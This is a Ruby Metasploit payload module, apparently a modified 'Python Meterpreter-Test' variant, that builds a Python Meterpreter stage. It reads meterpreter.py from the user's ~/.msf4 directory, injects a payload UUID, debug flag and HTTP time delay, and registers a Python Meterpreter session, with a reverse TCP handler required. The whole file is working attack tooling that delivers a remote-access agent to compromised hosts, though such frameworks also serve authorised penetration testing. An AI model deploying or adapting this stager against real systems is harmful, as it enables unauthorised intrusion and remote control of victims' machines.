##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_python'
require 'msf/base/sessions/meterpreter_options'

module Metasploit3
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Python Meterpreter-Test',
      'Description'   => 'Run a meterpreter server in Python (2.5-2.7 & 3.1-3.4)',
      'Author'        => 'Spencer McIntyre',
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Python_Python
    ))
    register_advanced_options([
      OptBool.new('PythonMeterpreterDebug', [ true, "Enable debugging for the Python meterpreter", false ]),
      OptString.new('TimeDelay', [ true, "Time delay", "1"]),
    ], self.class)
  end

  def generate_stage(opts={})
    file = ::File.join(ENV['HOME'], ".msf4/data", "meterpreter", "meterpreter.py")

    met = ::File.open(file, "rb") {|f|
      f.read(f.stat.size)
    }

    if datastore['PythonMeterpreterDebug']
      met = met.sub("DEBUGGING = False", "DEBUGGING = True")
    end

    uuid = opts[:uuid] || generate_payload_uuid
    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
    met = met.sub("PAYLOAD_UUID = \"\"", "PAYLOAD_UUID = \"#{bytes}\"")

    met = met.sub("HTTP_TIME_DELAY = 1", "HTTP_TIME_DELAY = #{datastore['TimeDelay']}")

    met
  end
end

